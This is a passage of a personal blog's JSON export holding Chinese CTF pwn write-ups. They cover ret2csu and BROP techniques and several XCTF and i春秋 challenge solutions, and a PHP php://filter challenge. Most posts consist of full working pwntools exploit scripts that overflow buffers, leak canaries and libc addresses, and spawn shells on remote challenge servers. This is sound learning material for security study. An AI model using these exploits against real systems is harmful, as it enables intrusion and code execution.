{"meta":{"title":"summerN's blog","subtitle":"","description":"","author":"summerN","url":"http://yoursite.com","root":"/"},"pages":[{"title":"about","date":"2019-12-16T10:41:24.000Z","updated":"2019-12-16T10:41:25.005Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-16T10:41:58.000Z","updated":"2019-12-16T10:41:58.555Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-12-16T10:41:44.000Z","updated":"2019-12-16T10:41:44.254Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2019-12-16T10:41:52.000Z","updated":"2019-12-16T10:41:52.351Z","comments":true,"path":"friends/index.html","permalink":"http://yoursite.com/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"中级ROP","slug":"中级ROP","date":"2020-01-14T14:38:29.610Z","updated":"2020-01-14T14:38:48.131Z","comments":true,"path":"2020/01/14/中级ROP/","link":"","permalink":"http://yoursite.com/2020/01/14/%E4%B8%AD%E7%BA%A7ROP/","excerpt":"中级ROP","text":"中级ROP 64位程序传参 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样 ret2__libc_csu_init看ctf-wiki 其中一个关于rsp移动的问题，就是payload中有一个 “a” * 0x38的具体解释见如下博客，感谢大佬 https://blog.csdn.net/zszcr/article/details/79833898 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *from LibcSearcher import LibcSearcher#context.log_level = 'debug'level5 = ELF('./level5')sh = process('./level5')write_got = level5.got['write']read_got = level5.got['read']main_addr = level5.symbols['main']bss_base = level5.bss()csu_front_addr = 0x0000000000400600csu_end_addr = 0x000000000040061Afakeebp = 'b' * 8def csu(rbx, rbp, r12, r13, r14, r15, last): #这里的r12 r13 r14 分别为第三 第二 第一个参数 # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1)sh.recvuntil('Hello, World\\n')## RDI, RSI, RDX, RCX, R8, R9, more on the stack## write(1,write_got,8)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr = u64(sh.recv(8))libc = LibcSearcher('write', write_addr)libc_base = write_addr - libc.dump('write')execve_addr = libc_base + libc.dump('execve')log.success('execve_addr ' + hex(execve_addr))##gdb.attach(sh)## read(0,bss_base,16)## read execve_addr and /bin/sh\\x00sh.recvuntil('Hello, World\\n')csu(0, 1, read_got, 16, bss_base, 0, main_addr)sh.send(p64(execve_addr) + '/bin/sh\\x00')sh.recvuntil('Hello, World\\n')## execve(bss_base+8)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)sh.interactive() 程序代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243.text:00000000004005C0 ; void _libc_csu_init(void).text:00000000004005C0 public __libc_csu_init.text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o.text:00000000004005C0 push r15.text:00000000004005C2 push r14.text:00000000004005C4 mov r15d, edi.text:00000000004005C7 push r13.text:00000000004005C9 push r12.text:00000000004005CB lea r12, __frame_dummy_init_array_entry.text:00000000004005D2 push rbp.text:00000000004005D3 lea rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004005DA push rbx.text:00000000004005DB mov r14, rsi.text:00000000004005DE mov r13, rdx.text:00000000004005E1 sub rbp, r12.text:00000000004005E4 sub rsp, 8.text:00000000004005E8 sar rbp, 3.text:00000000004005EC call _init_proc.text:00000000004005F1 test rbp, rbp.text:00000000004005F4 jz short loc_400616.text:00000000004005F6 xor ebx, ebx.text:00000000004005F8 nop dword ptr [rax+rax+00000000h].text:0000000000400600.text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j.text:0000000000400600 mov rdx, r13.text:0000000000400603 mov rsi, r14.text:0000000000400606 mov edi, r15d.text:0000000000400609 call qword ptr [r12+rbx*8].text:000000000040060D add rbx, 1.text:0000000000400611 cmp rbx, rbp.text:0000000000400614 jnz short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn.text:0000000000400624 __libc_csu_init endp 可以通过不同的地址对不同的寄存器使用 使用不同的gadgets 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647gef➤ x&#x2F;5i 0x000000000040061A 0x40061a &lt;__libc_csu_init+90&gt;: pop rbx 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14gef➤ x&#x2F;5i 0x000000000040061b 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15gef➤ x&#x2F;5i 0x000000000040061A+3 0x40061d &lt;__libc_csu_init+93&gt;: pop rsp 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret gef➤ x&#x2F;5i 0x000000000040061e 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x&#x2F;5i 0x000000000040061f 0x40061f &lt;__libc_csu_init+95&gt;: pop rbp 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x&#x2F;5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]gef➤ x&#x2F;5i 0x0000000000400621 0x400621 &lt;__libc_csu_init+97&gt;: pop rsi 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x&#x2F;5i 0x000000000040061A+9 0x400623 &lt;__libc_csu_init+99&gt;: pop rdi 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz ret 例题： 2016 XDCTF pwn100 脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *p = process('./pwn-100')elf = ELF('./pwn-100')puts_addr = elf.plt['puts']read_addr = elf.got['read']start_addr = 0x400550pop_rdi = 0x400763 gadget_1 = 0x40075agadget_2 = 0x400740bin_sh_addr = 0x60107c #存储/bin/sh的地址def leak(addr): up = '' content = '' payload = 'A'*0x48 payload += p64(pop_rdi) #这里使用了pop_rdi payload += p64(addr) payload += p64(puts_addr) payload += p64(start_addr) payload = payload.ljust(200, 'B') p.send(payload) p.recvuntil(\"bye~\\n\") while True: #防止未接受完整传回的数据 c = p.recv(numb=1, timeout=0.1) if up == '\\n' and c == \"\": content = content[:-1]+'\\x00' break else: content += c up = c content = content[:4] return contentd = DynELF(leak, elf=elf) #其实可以使用libsearch来搜索system与bin/shsystem_addr = d.lookup('system', 'libc')#调用read函数payload = \"A\"*0x48payload += p64(gadget_1)payload += p64(0)payload += p64(1)payload += p64(read_addr)payload += p64(8)payload += p64(bin_sh_addr)payload += p64(0)payload += p64(gadget_2)payload += '\\x00'*56payload += p64(start_addr)payload = payload.ljust(200, \"B\")#输入/bin/shp.send(payload)p.recvuntil('bye~\\n')p.send(\"/bin/sh\\x00\")#调用system函数payload = \"A\"*72 payload += p64(pop_rdi) payload += p64(bin_sh_addr) payload += p64(system_addr) payload = payload.ljust(200, \"B\") p.send(payload)p.interactive() ret2reg1.查看溢出函返回时哪个寄存值指向溢出缓冲区空间 2.然后反编译二进制，查找 call reg 或者jmp reg指令，将 EIP 设置为该指令地址 3.reg所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的 拿一个例题： HCTF2016的pwn 1.我们先爆破出栈溢出的长度 12345678910111213141516def getbufferflow_length(): i = 1 while 1: try: sh = remote('127.0.0.1', 9999) sh.recvuntil('WelCome my friend,Do you know password?\\n') sh.send(i * 'a') output = sh.recv() sh.close() if not output.startswith('No password'): return i - 1 else: i += 1 except EOFError: #如果报错，会显示EOFErrot sh.close() return i - 1 2.爆破我们需要的gadget 123456789101112131415def get_stop_addr(length): addr = 0x400000 while 1: try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) sh.sendline(payload) sh.recv() sh.close() print 'one success addr: 0x%x' % (addr) #若有正常返回，那么存在正确的add，输入即可，若没有，则报错 return addr except Exception: addr += 1 sh.close() 3.识别brop gadgets 下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546def get_brop_gadget(length, stop_gadget, addr): try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) + p64(0) * 6 + p64( stop_gadget) + p64(0) * 10 sh.sendline(payload) content = sh.recv() sh.close() print content # stop gadget returns memory if not content.startswith('WelCome'): return False return True except Exception: sh.close() return Falsedef check_brop_gadget(length, addr): try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) + 'a' * 8 * 10 sh.sendline(payload) content = sh.recv() sh.close() return False except Exception: sh.close() return True##length = getbufferflow_length()length = 72##get_stop_addr(length)stop_gadget = 0x4006b6addr = 0x400740while 1: print hex(addr) if get_brop_gadget(length, stop_gadget, addr): print 'possible brop gadget: 0x%x' % addr if check_brop_gadget(length, addr): print 'success brop gadget: 0x%x' % addr break addr += 1 在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\\x7fELF 4.所以我们可以接着去找put函数的地址即put@plt 我们找到的gadget为libc_csu_init中的可以操作6个寄存器的 所以我们可以使用pop_rdi = brop_add + 9来获得 1payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) 具体函数: 123456789101112131415161718def get_puts_addr(length, rdi_ret, stop_gadget): addr = 0x400000 while 1: print hex(addr) sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64( addr) + p64(stop_gadget) sh.sendline(payload) try: content = sh.recv() if content.startswith('\\x7fELF'): print 'find puts@plt addr: 0x%x' % addr return addr sh.close() addr += 1 except Exception: sh.close() 5.寻找put@got 123456789101112131415161718192021222324252627282930313233343536373839404142def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget): sh = remote('127.0.0.1', 9999) payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64( puts_plt) + p64(stop_gadget) sh.recvuntil('password?\\n') sh.sendline(payload) try: data = sh.recv() sh.close() try: data = data[:data.index(\"\\nWelCome\")] except Exception: data = data if data == \"\": data = '\\x00' return data except Exception: sh.close() return None##length = getbufferflow_length()length = 72##stop_gadget = get_stop_addr(length)stop_gadget = 0x4006b6##brop_gadget = find_brop_gadget(length,stop_gadget)brop_gadget = 0x4007bardi_ret = brop_gadget + 9##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)puts_plt = 0x400560addr = 0x400000result = \"\"while addr &lt; 0x401000: print hex(addr) data = leak(length, rdi_ret, puts_plt, addr, stop_gadget) if data is None: continue else: result += data addr += len(data) #这里的len(data)若为\\x00则为1，没毛病。若不为\\x00为其他字节，因为一个地址对应一个储存单元对应一字节，而且len(data)为字节数，所以输入多少个字节就往后移动多少字节就okwith open('code', 'wb') as f: f.write(result) 可以根据输出的数据转化为汇编来看plt表中的got地址 之后在通过put@plt泄露出puts@got中的内容（即libc中的地址） 123456789101112131415161718192021222324252627##length = getbufferflow_length()length = 72##stop_gadget = get_stop_addr(length)stop_gadget = 0x4006b6##brop_gadget = find_brop_gadget(length,stop_gadget)brop_gadget = 0x4007bardi_ret = brop_gadget + 9##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)puts_plt = 0x400560##leakfunction(length, rdi_ret, puts_plt, stop_gadget)puts_got = 0x601018sh = remote('127.0.0.1', 9999)sh.recvuntil('password?\\n')payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64( stop_gadget)sh.sendline(payload)data = sh.recvuntil('\\nWelCome', drop=True)puts_addr = u64(data.ljust(8, '\\x00'))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system_addr = libc_base + libc.dump('system')binsh_addr = libc_base + libc.dump('str_bin_sh')payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64( system_addr) + p64(stop_gadget)sh.sendline(payload)sh.interactive()","categories":[],"tags":[]},{"title":"攻防世界进阶区","slug":"攻防世界进阶区","date":"2020-01-13T15:09:26.763Z","updated":"2020-01-15T14:41:01.968Z","comments":true,"path":"2020/01/13/攻防世界进阶区/","link":"","permalink":"http://yoursite.com/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/","excerpt":"攻防世界进阶区","text":"攻防世界进阶区 1. dice _ game同新手区的那个随机数问题 exp： 12345678910111213141516171819202122232425262728#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *from ctypes import *file_name = './dice_game'libc_name = './libc.so.6'ip = '111.198.29.45'port = '43605'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)libc = cdll.LoadLibrary(\"libc.so.6\")p = remote(ip,port)libc.srand(1)p.recvuntil(\"Welcome, let me know your name: \")payload = \"a\" * (0x40) + p64(1)p.sendline(payload)for i in range(50): p.sendlineafter(\"Give me the point(1~6): \",str(libc.rand()%6 + 1))print p.recvall() 2.forgot使用@字符绕过下面的嵌套着swich语句的for循环 使得v14一直为1 从而使后面的调用函数的地址一直是v3的值 我们只需栈溢出覆盖v3的值为危险函数地址就好 123456789101112131415161718192021222324#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '59557'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)system = 0x80486ccpayload = \"@\" * 32 + p32(system)payload1 = \"summerN\"p.sendlineafter(\"&gt; \",\"a\")p.sendlineafter(\"&gt; \",payload)print p.recvall() 3.warmup先看一下sprintf()sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format[,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。sprintf是个变参函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 snprintf函数，该函数可对写入字符数做出限制。 题目直接通过sprintf函数泄露出了危险函数地址 exp: 4.Mary_Morton步骤： 1.通过格式化字符串漏洞泄露cannary 2.绕过cannary执行危险函数 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '57071'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p=process(file_name)p=remote(ip,port)alarm_add = 0x4008DAoffset = 6offset1 = offset + (0x90-8)/8#gdb.attach(p)p.recvuntil(\"3. Exit the battle \\n\")p.sendline(\"2\")payload = \"%23$p\"p.sendline(payload)cann = int(p.recv(18),16)print cannp.recvuntil(\"3. Exit the battle \\n\")payload1 = 'a'*(0x88) + p64(cann) + p64(1) + p64(0x4008DA) #p64里面不能有字符串p.sendline(\"1\")p.sendline(payload1)#p.recvline()p.interactive() 5.pwn1这个题的思路： 1.通过自带的puts函数泄露cannary 2.构造简单的rop泄露libc版本与基地址 3.拿到shell 注意： 本题中，如果想执行我们覆盖掉的返回地址，必须使程序结束，即s=3 因为我们覆盖的是main函数的返回地址，如果一直进行while循环的话是不可能进行return的 上exp： 别看exp很长，因为我走了很多弯路，其实exp很简单 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './babystack'libc_name = './libc-2.23.so'ip = '111.198.29.45'port = '45399'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)#p = process(file_name)pop_rdi = 0x0000000000400a93main_addr = 0x400908puts_plt = elf.plt['puts']puts_got = elf.got['puts']print hex(puts_plt)p.recvuntil(\"&gt;&gt; \")p.sendline(\"1\")payload1 = \"a\" * (0x90-8) + \"a\"p.send(payload1)p.recvuntil(\"&gt;&gt; \")p.sendline(\"2\")p.recvuntil(\"a\" * (0x90 -7))#print u64(p.recv(7).strip(\"\\n\").rjust(8,\"\\x00\"))cannary = hex(u64(p.recv(7).strip(\"\\n\").rjust(8,\"\\x00\")))#print p.recvline().strip(\"\\n\").ljust(8,\"\\x00\") print cannary'''p.recvuntil(\"&gt;&gt; \")#payload2 = \"a\" * (0x90-8) + p64(int(cannary,16)) + \"b\" * 8 + payload2 = p64(puts_got)p.sendline(\"1\")p.send(payload2)p.recvuntil(\"&gt;&gt; \")p.sendline(\"2\")start_add = u64(p.recv().ljust(8,\"\\x00\"))print hex(start_add)base_add = start_add - libc.symbols['__libc_start_main']print hex(libc.symbols['__libc_start_main'])print hex(base_add)sys_add = base_add + libc.symbols['system']bin_add = base_add + libc.search(\"/bin/sh\\x00\").next()'''p.recvuntil(\"&gt;&gt; \")payload2 = 'a'*0x88+p64(int(cannary,16))+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendline(\"1\")p.sendline(payload2)p.recvuntil(\"&gt;&gt; \")p.sendline(\"3\")start_add = u64(p.recv(8).ljust(8,'\\x00'))libc = LibcSearcher(\"puts\",start_add)libc_add = start_add - libc.dump(\"puts\")#print start_add#base_add = start_add - libc.symbols['puts']#print hex(libc.symbols['puts'])#print hex(base_add)sys_add = libc_add + libc.dump(\"system\")bin_add = libc_add + libc.dump(\"str_bin_sh\")p.recvuntil(\"&gt;&gt; \")p.sendline(\"1\")payload3 = \"a\" * (0x90-8) + p64(int(cannary,16)) + p64(1) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)p.sendline(payload3)p.recvuntil(\"&gt;&gt; \")p.sendline(\"3\")p.interactive() 6.monkey64位程序 从来没遇见过引入js库的pwn题 引入了js，估计就是个js语言解释器 注意： 1.这道题目多了几个动态链接库，我先说明一下怎么在python+pwn中使用动态链接库： 1p = process([process_name], env=&#123;'LD_LIBRARY_PATH':'./'&#125;) 2. 1p.sendlineafter(&#39;js&gt;&#39;,&#39;os.system(\\&#39;cat flag\\&#39;)&#39;) 这里我们需要在后面加上\\进行转移 或者将里面的单引号转变为双引号 我们发现我们输入的js函数会执行，因此上exp： 1234567891011121314#encoding:utf-8from pwn import *context.log_level = 'debug'file_name = './js'ip = '111.198.29.45'port = '42533'p = remote(ip,port)#p = process([file_name], env=&#123;'LD_LIBRARY_PATH':'./'&#125;) #在本地中使用动态库p.sendlineafter('js&gt;','os.system(\\'cat flag\\')')p.recv()p.interactive()","categories":[],"tags":[]},{"title":"php伪协议","slug":"php伪协议","date":"2020-01-12T13:30:55.096Z","updated":"2020-01-12T13:32:10.954Z","comments":true,"path":"2020/01/12/php伪协议/","link":"","permalink":"http://yoursite.com/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"php伪协议","text":"php伪协议 看一道题 上图 可知涉及到php伪协议的问题 1.在file_get_contents 这里 我们可以使用php://这个协议php://input可以得到原始的post数据 2.在include（）这里我们可以看到后面有个提示hint.php 但是我们把file=hint.php时仍然没有任何代码 我们可以使用： php://filter/convert.base64-encode/resource=取源代码并进行base64编码输出 若不使用base64编码，我们读取的内容会直接当做php代码执行就看不到源代码内容了。 上payload 123?Yeedo&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.phppost:Yeedo is a big hacker 解码base64 得到 123&lt;?php //decode(423e1e68bdc71183573da0cd33a1609)='ypcwelcome';?&gt; 在之前的payload基础上添加 1password&#x3D;ypcwelcome 得到flag 1flag&#123;1a19cbc0200dc984ae400d331a7d1a3d&#125;","categories":[],"tags":[]},{"title":"第四季答题赛 pwn","slug":"第四季答题赛 pwn","date":"2019-12-29T02:28:53.523Z","updated":"2019-12-29T02:29:34.452Z","comments":true,"path":"2019/12/29/第四季答题赛 pwn/","link":"","permalink":"http://yoursite.com/2019/12/29/%E7%AC%AC%E5%9B%9B%E5%AD%A3%E7%AD%94%E9%A2%98%E8%B5%9B%20pwn/","excerpt":"i春秋·第四季答题赛 pwn","text":"i春秋·第四季答题赛 pwn 1.Self-service Refueling System这个题要注意我们覆盖的地址为main函数的返回地址，所以要知道我们接受的 __libc_start_main 地址之前要接受的字符串 在做这个题的时候问题就出现在的 1.接受地址的时候没有去掉\\n 2.忘记了将我们覆盖的地方是main函数的返回地址 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './2'#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'ip = '120.55.43.255'port = '23810'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p = process(file_name)p = remote(ip,port)read_got = elf.got['__libc_start_main']puts_plt = elf.plt['puts']pop_rdi = 0x0000000000400fb3main = 0x400EAApayload = \"a\" * (0x20 - 0x8) + p32(26214) + p32(9011)+ p64(8) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)#payload = \"a\" * (0x20) +p64(8) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)print p.recvuntil(\"Do you want to refuel?(y/n)\\n\")p.sendline(\"y\")print p.recvuntil(\"Plz input your Gas Card ID :\\n\")p.sendline(payload)p.sendlineafter(\"ou want?(L)\\n\",\"1L\")print p.recvuntil(\"gas\\n\")print p.recvuntil(\"\\x30\\x6d\")add = u64(p.recvline().strip(\"\\n\").ljust(8,\"\\x00\"))#print p.recvline()print hex(add)libc = LibcSearcher(\"__libc_start_main\",int(add))libc_add = add - libc.dump(\"__libc_start_main\")print libc_addbin_add = libc_add + libc.dump(\"str_bin_sh\")sys_add = libc_add + libc.dump(\"system\")ret = 0x4008B1payload2 = \"a\" * (0x20 - 0x8) + p32(26214) + p32(9011)+ p64(8) + p64(pop_rdi) + p64(bin_add)+p64(sys_add)print p.recvline()#print p.recvuntil(\"Do you want to refuel?(y/n)\")p.sendline(\"y\")print p.recvuntil(\"Plz input your Gas Card ID :\\n\")p.sendline(payload2)p.sendlineafter(\"How mang gas do you want?(L)\\n\",\"1L\")#gdb.attach(p)p.interactive()","categories":[],"tags":[]},{"title":"攻防世界新手区pwn","slug":"攻防世界新手区pwn","date":"2019-12-22T13:26:27.160Z","updated":"2019-12-29T02:29:45.741Z","comments":true,"path":"2019/12/22/攻防世界新手区pwn/","link":"","permalink":"http://yoursite.com/2019/12/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BApwn/","excerpt":"攻防世界新手区pwn","text":"攻防世界新手区pwn 1 ncnc 链接获取flag 2知识： 关于stdin的知识见博客：https://blog.csdn.net/xmzzy2012/article/details/80584910 即：在c语言中表现为调用printf函数将内容输出到终端上。 这里使用的知识点为任意地址写入： 我们先找到偏移量 通过查看找到偏移量offset为：10 之后我们就可以使用任意地址写 上exp 12345678910111213 #coding=utf-8from pwn import *p = remote(\"111.198.29.45\",46545)offset = 10pwnme_add = 0x804a068print p.recvuntil(\"name:\\n\")p.sendline(\"summerN\")print p.recvuntil(\"please:\\n\")payload = p32(pwnme_add) + \"%4c%10$hhn\"p.sendline(payload)print p.recv() 3首先查看保护 发现开启了栈溢出保护但是对于这个题来说貌似没什么卵用 看完程序，发现直接从get（）那里溢出进入v5直接覆盖就好 exp如下： 123456789101112#coding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",59473)print p.recvuntil(\"What's Your Birth?\\n\")p.sendline(\"12\")print p.recvuntil(\"What's Your Name?\\n\")payload = \"A\" * 8 + p64(1926)p.sendline(payload)print p.recvall() 4先checksec一下 64位 bss数据区覆盖一下就可以 exp: 123456789from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",33733)p.recvuntil(\"lets get helloworld for bof\\n\")x = hex(1853186401)print xpayload = \"BBBB\" + p64(0x6e756161)p.sendline(payload)p.recvall() 注意： p64这类打包函数不可以使用例如x = hex(11)这类的函数 而可以使用直接对变量赋值的变量例如x = 11 5先check 看IDA exp: 1234567891011#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_ level='debug')p = remote(\"111.198.29.45\",59602)bin_add = 0x400596p.recvuntil(\"Hello, World\\n\")payload = 'a' * (0x80 + 8) + p64(bin_add)p.sendline(payload)p.interactive() 6这里的话就是构造32位程序的ROP链 注意这种问题在使用elf.symbols()获取的system（）函数的地址 32位会出现，64位应该不会，所以32位多填充p32(),64位多填充p64() 也就是说只要是搜索出的call system（不是自己定义的危险函数）在system 与其后面的参数之间就要间隔对应的参数 很简单，但是遇到了一个问题 1.如果直接使用后text段的system地址的话，就很好说，不用废话 12345678910#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",32152)bin_add = 0x0804a024sys_add = 0x804849epayload = \"a\" * (0x88 + 4) + p32(sys_add) + p32(bin_add)p.recvuntil(\"Input:\\n\")p.sendline(payload)p.interactive() 2.但是如果使用.plt段的system函数的真实地址的话就不大行了 exp 12345678910#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",32152)bin_add = 0x0804a024sys_add = 0x8048320payload = \"a\" * (0x88 + 4) + p32(sys_add)+ \"a\" *4 + p32(bin_add)p.recvuntil(\"Input:\\n\")p.sendline(payload)p.interactive() 具体是因为什么我也不清楚 总之先记住 如果是从libc泄露的system的话。。。。应该是第二种了吧 看下我自己的认为。。 在使用.plt段的system时 看这个哈 我们输入的bin/sh因该位于ptr 向后4个的位置，往后看你会发先会有一个call的指令 我们都知道call会向栈中push一个下一条指令的地址（貌似是在str的位置，具体也不清楚） 因此我们要先将这个地址覆盖之后我们才可以传入bin/sh 就先这样理解吧。。。。 其实刚才那样理解就是这个意思： 跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行就先这样吧。。 7先增加一个知识，函数指针 http://c.biancheng.net/view/228.html 关于函数指针的介绍 再来看这里 这里把v1这个void类型指针先强制类型转化为一个返回八字节的函数指针 通过read函数向其赋值地址 再来增加几个知识： alarm()可以用来限制运行时间，干扰调试 mmap（）可以开辟出一片可读可写的内存空间 我们来找偏移 从IDA上可以看到，我们可以a1的地址存放到偏移量为7的地方，所以构造以下字符串 构造payload = %85d%7&amp;n exp： 123456789101112131415161718192021222324#encoding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = remote(\"111.198.29.45\",54738)print p.recvuntil(\"secret[0] is \")v3 = p.recvline().strip(\"\\n\")v3_add = int((\"0x\" + str(v3)),16)print v3_addprint p.recvuntil(\"What should your character's name be:\\n\")p.sendline(\"a\")print p.recvuntil(\"So, where you will go?east or up?:\\n\")p.sendline(\"east\")print p.recvuntil(\"o into there(1), or leave(0)?:\\n\")p.sendline(\"1\")print p.recvuntil(\"'Give me an address'\\n\")p.sendline(str(v3_add))print p.recvuntil(\"And, you wish is:\\n\")payload = \"%85c%7$n\"p.sendline(payload)print p.recvuntil(\"Wizard: I will help you! USE YOU SPELL\\n\")shellcode = asm(shellcraft.sh())print shellcodep.sendline(shellcode)p.interactive() 注意：！！！！！ 在写shellcode的时候最好加一下context 8srand()​ srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。 